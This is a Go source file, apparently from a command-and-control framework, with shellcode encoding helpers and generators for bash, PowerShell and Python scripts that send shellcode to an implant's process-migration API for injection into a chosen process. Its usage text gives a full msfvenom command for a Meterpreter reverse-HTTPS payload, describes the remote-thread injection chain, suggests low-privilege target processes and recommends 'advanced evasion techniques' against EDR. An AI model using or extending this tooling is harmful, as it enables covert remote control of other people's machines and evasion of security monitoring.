package shellcode

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
)

// EncodeForAPI 将原始shellcode字节数组编码为API需要的base64字符串
func EncodeForAPI(shellcode []byte) string {
	return base64.StdEncoding.EncodeToString(shellcode)
}

// DecodeFromAPI 将API接收的base64字符串解码为原始shellcode
func DecodeFromAPI(encoded string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(encoded)
}

// HexToBase64 将十六进制字符串转换为base64编码
func HexToBase64(hexStr string) (string, error) {
	shellcode, err := hex.DecodeString(hexStr)
	if err != nil {
		return "", fmt.Errorf("failed to decode hex string: %w", err)
	}
	return EncodeForAPI(shellcode), nil
}

// Base64ToHex 将base64编码转换为十六进制字符串
func Base64ToHex(b64Str string) (string, error) {
	shellcode, err := DecodeFromAPI(b64Str)
	if err != nil {
		return "", fmt.Errorf("failed to decode base64 string: %w", err)
	}
	return hex.EncodeToString(shellcode), nil
}

// LoadFromFile 从文件加载shellcode并编码为API格式
func LoadFromFile(filePath string) (string, error) {
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return "", fmt.Errorf("failed to read file: %w", err)
	}
	return EncodeForAPI(data), nil
}

// SaveToFile 将API格式的shellcode保存到文件
func SaveToFile(encoded string, filePath string) error {
	shellcode, err := DecodeFromAPI(encoded)
	if err != nil {
		return fmt.Errorf("failed to decode shellcode: %w", err)
	}
	return ioutil.WriteFile(filePath, shellcode, 0644)
}

// ValidateShellcode 验证shellcode的基本有效性
func ValidateShellcode(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode is empty")
	}

	// 检查最小长度（至少应该有几个字节）
	if len(shellcode) < 10 {
		return fmt.Errorf("shellcode is too small (minimum 10 bytes)")
	}

	// 检查最大长度（防止内存攻击）
	maxSize := 10 * 1024 * 1024 // 10MB
	if len(shellcode) > maxSize {
		return fmt.Errorf("shellcode is too large (maximum 10MB)")
	}

	return nil
}

// PrintShellcodeInfo 打印shellcode信息用于调试
func PrintShellcodeInfo(shellcode []byte) {
	fmt.Printf("Shellcode Info:\n")
	fmt.Printf("  Length: %d bytes\n", len(shellcode))
	fmt.Printf("  Base64: %s...\n", EncodeForAPI(shellcode)[:min(50, len(EncodeForAPI(shellcode)))])
	fmt.Printf("  Hex: %s...\n", hex.EncodeToString(shellcode)[:min(50, len(hex.EncodeToString(shellcode)))])
	fmt.Printf("  First 16 bytes: % x\n", shellcode[:min(16, len(shellcode))])
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// PrintUsage 打印使用说明
func PrintUsage() {
	fmt.Printf(`Shellcode Helper Utilities

This package provides utilities for working with shellcode.

Common Shellcode Generation Methods:

1. Using msfvenom (Metasploit):
   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=your_ip LPORT=443 -f raw -o shell.bin
   Then use LoadFromFile("shell.bin") to encode it

2. Using the builder API:
   POST /api/v1/builders/download with format="shellcode"
   This will return hex-encoded shellcode

3. Custom shellcode:
   Compile your position-independent code and use the utilities in this package

Example Usage in Go:

  // Load shellcode from file
  encoded, err := shellcode.LoadFromFile("shell.bin")
  if err != nil {
      log.Fatal(err)
  }

Important Notes:

1. Architecture Mismatch:
   - x64 shellcode can only be injected into x64 processes
   - x86 shellcode can only be injected into x86 processes
   - The implant will automatically check and reject mismatches

2. Permissions:
   - Requires Administrator privileges to inject into most system processes
   - Test with lower-privilege processes first (e.g., notepad.exe, explorer.exe)

3. Detection:
   - Classic injection (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
     is detected by most EDR solutions
   - Consider using advanced evasion techniques for production use
`)
}

// WriteExampleScript 写入示例脚本到文件
func WriteExampleScript(outputPath string) error {
	script := `#!/bin/bash
# Example script for using the process migration API

# Configuration
SERVER="http://localhost:8080"
TOKEN="your-jwt-token"
SESSION_ID="session-uuid"
TARGET_PID=1234
SHELLCODE_FILE="shell.bin"

# Check if shellcode file exists
if [ ! -f "$SHELLCODE_FILE" ]; then
    echo "Error: Shellcode file not found: $SHELLCODE_FILE"
    echo "Generate it using msfvenom:"
    echo "  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=your_ip LPORT=443 -f raw -o $SHELLCODE_FILE"
    exit 1
fi

# Encode shellcode to base64
SHELLCODE_B64=$(base64 -w 0 "$SHELLCODE_FILE")

# Send migration request
echo "Sending process migration request..."
echo "  Target PID: $TARGET_PID"
echo "  Session: $SESSION_ID"
echo "  Shellcode size: $(wc -c < "$SHELLCODE_FILE") bytes"

RESPONSE=$(curl -s -X POST "$SERVER/api/v1/sessions/$SESSION_ID/migrate" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"pid\": $TARGET_PID, \"shellcode\": \"$SHELLCODE_B64\"}")

echo "Response:"
echo "$RESPONSE" | jq .

# Extract task ID
TASK_ID=$(echo "$RESPONSE" | jq -r '.task_id')

if [ "$TASK_ID" != "null" ] && [ "$TASK_ID" != "" ]; then
    echo ""
    echo "Task created: $TASK_ID"
    echo "Check task status:"
    echo "  curl -H \"Authorization: Bearer $TOKEN\" $SERVER/api/v1/tasks/$TASK_ID | jq ."
fi
`
	return ioutil.WriteFile(outputPath, []byte(script), 0755)
}

// WritePowerShellExample 写入PowerShell示例脚本
func WritePowerShellExample(outputPath string) error {
	script := `# PowerShell example for using the process migration API

param(
    [string]$Server = "http://localhost:8080",
    [string]$Token = "your-jwt-token",
    [string]$SessionID = "session-uuid",
    [int]$TargetPID = 1234,
    [string]$ShellcodeFile = "shell.bin"
)

# Check if shellcode file exists
if (-not (Test-Path $ShellcodeFile)) {
    Write-Error "Shellcode file not found: $ShellcodeFile"
    Write-Host "Generate it using msfvenom:"
    Write-Host "  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=your_ip LPORT=443 -f raw -o $ShellcodeFile"
    exit 1
}

# Read and encode shellcode
$shellcodeBytes = [System.IO.File]::ReadAllBytes($ShellcodeFile)
$shellcodeB64 = [Convert]::ToBase64String($shellcodeBytes)

Write-Host "Sending process migration request..."
Write-Host "  Target PID: $TargetPID"
Write-Host "  Session: $SessionID"
Write-Host "  Shellcode size: $($shellcodeBytes.Length) bytes"

# Prepare request
$headers = @{
    "Authorization" = "Bearer $Token"
    "Content-Type" = "application/json"
}

$body = @{
    pid = $TargetPID
    shellcode = $shellcodeB64
} | ConvertTo-Json

# Send request
try {
    $response = Invoke-RestMethod -Uri "$Server/api/v1/sessions/$SessionID/migrate" -Method POST -Headers $headers -Body $body

    Write-Host ""
    Write-Host "Response:"
    $response | ConvertTo-Json

    if ($response.task_id) {
        Write-Host ""
        Write-Host "Task created: $($response.task_id)"
        Write-Host "Check task status:"
        Write-Host '  Invoke-RestMethod -Headers $headers "$Server/api/v1/tasks/$($response.task_id)"'
    }
} catch {
    Write-Error "Request failed: $_"
}
`
	return ioutil.WriteFile(outputPath, []byte(script), 0644)
}

// WritePythonExample 写入Python示例脚本
func WritePythonExample(outputPath string) error {
	script := `#!/usr/bin/env python3
"""
Python example for using the process migration API
"""

import requests
import base64
import json
import sys

def main():
    # Configuration
    server = "http://localhost:8080"
    token = "your-jwt-token"
    session_id = "session-uuid"
    target_pid = 1234
    shellcode_file = "shell.bin"

    # Check if shellcode file exists
    try:
        with open(shellcode_file, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"Error: Shellcode file not found: {shellcode_file}")
        print("Generate it using msfvenom:")
        print(f"  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=your_ip LPORT=443 -f raw -o {shellcode_file}")
        sys.exit(1)

    # Encode shellcode
    shellcode_b64 = base64.b64encode(shellcode).decode('utf-8')

    print("Sending process migration request...")
    print(f"  Target PID: {target_pid}")
    print(f"  Session: {session_id}")
    print(f"  Shellcode size: {len(shellcode)} bytes")

    # Prepare request
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    payload = {
        "pid": target_pid,
        "shellcode": shellcode_b64
    }

    # Send request
    try:
        response = requests.post(
            f"{server}/api/v1/sessions/{session_id}/migrate",
            headers=headers,
            json=payload
        )
        response.raise_for_status()

        result = response.json()
        print("\nResponse:")
        print(json.dumps(result, indent=2))

        if result.get('task_id'):
            print(f"\nTask created: {result['task_id']}")
            print("Check task status:")
            print(f"  requests.get('{server}/api/v1/tasks/{result['task_id']}', headers={headers})")

    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
`
	return ioutil.WriteFile(outputPath, []byte(script), 0755)
}

// GenerateAllExamples 生成所有示例脚本
func GenerateAllExamples(outputDir string) error {
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %w", err)
	}

	scripts := map[string]func(string) error{
		"migrate_example.sh":       WriteExampleScript,
		"migrate_example.ps1":      WritePowerShellExample,
		"migrate_example.py":       WritePythonExample,
	}

	for filename, writer := range scripts {
		filePath := outputDir + "/" + filename
		if err := writer(filePath); err != nil {
			return fmt.Errorf("failed to write %s: %w", filename, err)
		}
		fmt.Printf("Generated: %s\n", filePath)
	}

	// Also print usage
	PrintUsage()

	return nil
}